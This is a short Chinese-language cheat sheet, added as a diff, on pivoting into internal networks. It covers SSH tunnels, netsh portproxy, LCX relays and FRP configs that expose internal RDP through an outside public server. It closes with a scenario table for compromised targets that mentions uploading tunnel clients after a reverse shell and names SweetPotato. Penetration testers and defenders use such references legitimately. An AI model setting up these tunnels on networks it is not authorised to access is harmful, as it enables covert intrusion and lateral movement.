@@ -1,0 +1,87 @@
+# 内网端口转发
+
+## SSH 隧道
+
+### 本地转发
+```bash
+# 将远程主机的端口映射到本地
+ssh -L 本地端口:目标IP:目标端口 user@跳板机
+
+# 例：访问内网 10.0.0.1:80
+ssh -L 8080:10.0.0.1:80 user@跳板机
+# 访问 http://localhost:8080
+```
+
+### 远程转发
+```bash
+# 将本地端口映射到远程服务器（适合内网无公网IP）
+ssh -R 远程端口:本地IP:本地端口 user@公网服务器
+
+# 例：让公网服务器访问内网 web
+ssh -R 8080:127.0.0.1:80 user@公网服务器
+# 公网服务器访问 http://localhost:8080
+```
+
+### 动态转发（SOCKS 代理）
+```bash
+ssh -D 1080 user@跳板机
+# 配合 proxychains 使用
+proxychains nmap -sT 10.0.0.0/24
+```
+
+## netsh（Windows）
+```cmd
+# 添加端口转发
+netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=10.0.0.1 connectport=80
+
+# 查看
+netsh interface portproxy show all
+
+# 删除
+netsh interface portproxy del v4tov4 listenport=8080
+```
+
+## LCX / portmap
+```bash
+# 内网执行
+lcx -slave 公网IP 4444 127.0.0.1 3389
+
+# 公网执行
+lcx -listen 4444 5555
+# 访问 公网IP:5555 → 内网的3389
+```
+
+## FRP（功能最全）
+```bash
+# frps.ini（服务端）
+[common]
+bind_port = 7000
+
+# frpc.ini（客户端）
+[common]
+server_addr = 公网IP
+server_port = 7000
+
+[rdp]
+type = tcp
+local_ip = 127.0.0.1
+local_port = 3389
+remote_port = 33890
+```
+
+## 场景速查
+```
+目标内网无公网IP：
+  → SSH 远程转发（需能连外网）
+  → FRP（功能最全）
+  → NPS
+
+目标只有 web 权限（不支持 SSH）：
+  → 上传 FRP/NPS 客户端
+  → EarthWorm（EW）
+  → 反弹 Shell 后使用 LCX
+
+目标 Windows 系统：
+  → netsh（自带，无需上传）
+  → Termite / SweetPotato
+```
